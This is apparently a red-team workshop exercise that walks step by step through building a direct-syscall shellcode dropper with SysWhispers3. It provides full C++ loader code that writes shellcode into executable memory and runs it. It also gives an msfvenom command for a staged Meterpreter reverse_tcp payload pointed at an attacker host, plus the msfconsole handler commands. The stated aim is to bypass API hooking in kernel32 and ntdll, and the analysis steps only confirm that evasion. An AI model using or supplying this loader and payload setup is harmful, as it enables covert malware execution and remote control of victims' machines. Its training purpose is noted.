## Exercise 5: Low_Level_API_Dropper
In this exercise, we will make the second modification to the reference dropper, create the direct syscall dropper, and implement the required syscalls or syscall stub directly into the **Low-Level API shellcode dropper** for short **LLA dropper**. 
![low_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235438881-e4af349a-0109-4d8e-80e2-730915c927f6.png)

## Exercise 5 tasks:
### Create LLA-Dropper 
1. Create necessary code for LLA-Dropper with SysWhispers3
1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the LLA-Dropper.
2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ LLA-Dropper poc. 
3. Compile the LLA-Dropper as release or debug x64. 
4. Create and run a staged x64 meterpreter listener with msfconsole.
5. Run your compiled .exe and verify that a stable command and control channel opens. 
### Analyse HLA-Dropper
6. Use the Visual Studio tool dumpbin to analyze the compiled LLA-Dropper. Is the result what you expected?  
7. Use the API Monitor to analyze the compiled LLA-Dropper in the context of the four APIs used. Is the result what you expected? 
8. Use the x64dbg debugger to analyze the compiled LLA dropper: from which module and location are the syscalls from the four APIs used being executed?
Is the result what you expected? 

## SysWhispers 3
Again, we need to implement the code for the four native APIs we use, but unlike the Medium_Level dropper, we do not load the corresponding syscalls from ntdll.dll. Instead, we want to implement the necessary code directly in our LLA dropper. Therefore we have to create the corresponding code or files with the tool SysWhispers3 from [**@KlezVirus**](https://twitter.com/KlezVirus). To create the necessary code in context of our LLA-Dropper you can use the following command with SysWhispers. Because we work with the MSVC compiler in Visual Studio we choose for the -c parameter msvc. 
<details>
    
**kali>**
```
python syswhispers.py -a x64 -c msvc -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtWaitForSingleObject -o syscalls -v
```
</details>

SysWhispers3 creates for us the three files **syscalls.h**, **syscalls.c** and **syscalls-asm.x64.asm**, which we later implement in our LLA-Dropper and which represent the code for the direct syscall implementation. 
<details>
 
<p align="center">
<img width="942" alt="image" src="https://user-images.githubusercontent.com/50073731/235453951-f99fe798-79b9-458e-93af-5d0b3c52a0de.png">
</details>



## Visual Studio
To create the LLA-Dropper project, follow the procedure of the high-level API dropper exercise, take a look to follow the necessary steps.
The code works as follows, shellcode declaration is the same as before in both droppers.
<details>

```
// Insert the Meterpreter shellcode as an array of unsigned chars (replace the placeholder with actual shellcode)
    unsigned char code[] = "\xfc\x48\x83";
```
</details>


In the case of the LLA-Dropper, we also need to access the syscalls or syscalls stub from the respective native APIs. Again, we use the same native APIs as in the MLA-Dropper. 
But this time we do not want to run/import the syscalls from ntdll.dll and instead want to implement the functionality directly in the LLA-Dropper itself, we have to import the generated files/code from SysWhispers 3 into our LLA-Dropper. The syscalls.h provides the structure of the used native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject and the syscalls-asm.x64.asm contains the corresponding syscalls or syscall stubs. This allows the LLA dropper to execute syscalls directly without the transition from dropper.exe -> kernel32.dll -> ntdll.dll. Practically, we need to implement the generated code with SysWhispers 3 as follows: 

1. Copy all three files we created with SysWhispers 3 into the directory of your LLA-Dropper Visual Studio project.
<details>
 
<p align="center">
<img width="697" alt="image" src="https://user-images.githubusercontent.com/50073731/235456064-2b124b99-6936-4a96-a878-2e8dd8cdb460.png">
</details>

    
2. Add the syscalls.h file to your LLA-Dropper project as a header file. 
<details>
 
<p align="center">
<img width="1269" alt="image" src="https://user-images.githubusercontent.com/50073731/235456468-ffd08548-6f71-4904-821c-6d88580fa3fb.png">
<img width="599" alt="image" src="https://user-images.githubusercontent.com/50073731/235456549-4385fe3d-4a77-49d7-a153-19e0c5e54cf8.png">
</details>

3. We also need to include the header syscalls.h as a library in our code. 
Customisations.
<details>
 
<p align="center">
<img width="1285" alt="image" src="https://user-images.githubusercontent.com/50073731/235458107-e86178b5-f4f2-4110-a415-d93a08f61373.png">
</details>

4. Add the syscalls-asm.x64.asm file as a resource file. 
<details>
 
<p align="center">
<img width="1268" alt="image" src="https://user-images.githubusercontent.com/50073731/235456751-b44a0786-5225-46d7-9ec3-032a6b8ab36c.png">
<img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235456831-138e449f-11ae-4cc6-9483-4073eed67c49.png">
</details>

5. Add the file syscall.c as source file
<details>
 
<p align="center">
<img width="1263" alt="image" src="https://user-images.githubusercontent.com/50073731/235457023-473375d1-591d-4479-b47c-2918af056ff2.png">
<img width="598" alt="image" src="https://user-images.githubusercontent.com/50073731/235457085-bf6775f0-c370-4bb0-b883-db99123b06ca.png">
</details>

6. To use the assembly code from the syscalls-asm.x64.asm file in Visual Studio, you must enable the Microsoft Macro Assembler (.masm) option in Build Dependencies/Build. Customisations.
<details>
 
<p align="center">
<img width="1278" alt="image" src="https://user-images.githubusercontent.com/50073731/235457590-371f3519-b7cf-483d-9c1c-6bfd6368be42.png">
<img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235457782-780d2136-30d7-4e87-a022-687ed2557b33.png">
</details>

7. Then we need to set the Item Type of the syscalls-asm.x64.asm file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in our LLA dropper. 
<details>
 
<p align="center">
<img width="950" alt="image" src="https://user-images.githubusercontent.com/50073731/235471947-4bcd23fc-5093-4f4d-adc8-eb3ef36f139f.png">    
<img width="1237" alt="image" src="https://user-images.githubusercontent.com/50073731/235458968-e330799e-51ff-46bf-97ab-c7d3be7ea079.png">
<img width="778" alt="image" src="https://user-images.githubusercontent.com/50073731/235459219-4387dc48-56f8-481c-b978-1b786843a836.png">
    
</details>

Here is the **complete code**, and you can copy and paste this code into your **LLA-Dropper** project in Visual Studio.
You can also download the complete **LLA-Dropper Visual Studio project** in the **Code Example section** of this repository.
<details>
    
```
#include <iostream>
#include <Windows.h>
#include "syscalls.h"

int main() {
    // Insert Meterpreter shellcode
    unsigned char code[] = "\xfc\x48\x83...";

    // Allocate Virtual Memory with PAGE_EXECUTE_READWRITE permissions to store the shellcode
    // 'exec' will hold the base address of the allocated memory region
    void* exec = NULL;
    SIZE_T size = sizeof(code);
    NtAllocateVirtualMemory(GetCurrentProcess(), &exec, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy the shellcode into the allocated memory region
    SIZE_T bytesWritten;
    NtWriteVirtualMemory(GetCurrentProcess(), exec, code, sizeof(code), &bytesWritten);

    // Execute the shellcode in memory using a new thread
    // Pass the address of the shellcode as the thread function (StartRoutine) and its parameter (Argument)
    HANDLE hThread;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), exec, exec, FALSE, 0, 0, 0, NULL);

    // Wait for the end of the thread to ensure the shellcode execution is complete
    NtWaitForSingleObject(hThread, FALSE, NULL);


    // Return 0 as the main function exit code
    return 0;
}
```
</details>

    
    
    
## Meterpreter Shellcode
Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
<details>
    
 **kali>**   
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
```
<p align="center">
<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
</p>

The shellcode can then be copied into the LLA-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
</p>
</details>    


## MSF-Listener
Before we test the functionality of our LLA-Dropper, we need to create a listener within msfconsole.
<details>
    
**kali>**
```
msfconsole
```
**msf>**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost IPv4_Redirector_or_IPv4_Kali
set lport 80 
set exitonsession false
run
```
<p align="center">
<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
</p>
</details>
 
    
Once the listener has been successfully started, you can run your compiled LLA-Dropper.exe. If all goes well, you should see an incoming command and control session. 
<details>
    
<p align="center">
<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
</p>
</details>
        

    
## LLA-Dropper analysis: dumpbin 
The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
<details>    
    
**cmd>**
```
cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
dumpbin /imports high_level.exe
```
</details>    

<details>
    <summary>Solution</summary>  
    
**No imports** from the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
<p align="center">
<img width="1023" alt="image" src="https://user-images.githubusercontent.com/50073731/235473764-c85ccc73-a1cb-403d-8162-172146375d96.png">
</p>
</details>   
    
    
## LLA-Dropper analysis: API-Monitor
For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in the context of the used APIs in our MLA dropper. We filter on the following API calls:
- VirtualAlloc
- NtAllocateVirtualMemory
- WriteProcessMemory
- NtWriteVirtualMemory
- CreateThread
- NtCreateThreadEx
- WaitForSingleObject
- NtWaitForSingleObject

<details>
    <summary>Solution</summary>    
If everything was done correctly, you could see that the four used Windows APIs and their native APIs are no longer imported from kernel32.dll and ntdll.dll to the LLA-Dropper.exe.
This result was expected and is correct because our LLA dropper has directly implemented the necessary syscalls or syscall stubs for the respective native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject.
<p align="center">
<img width="595" alt="image" src="https://user-images.githubusercontent.com/50073731/235480936-df805736-aad8-44a7-8bec-f8563735d1d2.png">
</p>
</details>    

## LLA-Dropper analysis: x64dbg 
Using x64dbg we want to validate from which module and location the respective system calls are executed in the context of the used Windows APIs -> native APIs?
Remember, now we have not implemented system calls or system call stubs directly in the dropper. What results would you expect?
<details>
    <summary>Solution</summary>
    
1. Open or load your LLA-Dropper.exe into x64dbg
2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight your **LLA-Dropper.exe**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. Compared to the HLA-Dropper and the MLA-Dropper we can see that the symbols for the used native APIs are implemented directly in the dropper itself and not imported from the ntdll.dll.
    
<p align="center">    
<img width="979" alt="image" src="https://user-images.githubusercontent.com/50073731/235481553-012459f5-1284-44ed-b3ed-2b04bfcccd3b.png">
</p>
    
As expected, we can observe that the corresponding system calls for the native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject are no longer 
imported from the .text section in the ntdll.dll module. Instead the syscalls or syscalls stubs are directly implemtented into the .text section of the LLA-Dropper itself.
    
<p align="center">    
<img width="990" alt="image" src="https://user-images.githubusercontent.com/50073731/235482389-35cd8c12-593e-4089-b082-8eaf2ba6636a.png"></p>    
</details>


## Summary:
- Made transition from medium to low level or from Native APIs to direct syscalls
- Dropper imports no longer Windows APIs from kernel32.dll
- Dropper imports no longer Native APIs from ntdll.dll
- Syscalls or syscall stubs are "implemented" directly into .text section of .exe![image](https://user-images.githubusercontent.com/50073731/235482977-60492450-e08f-4260-81f8-4198706d4741.png)

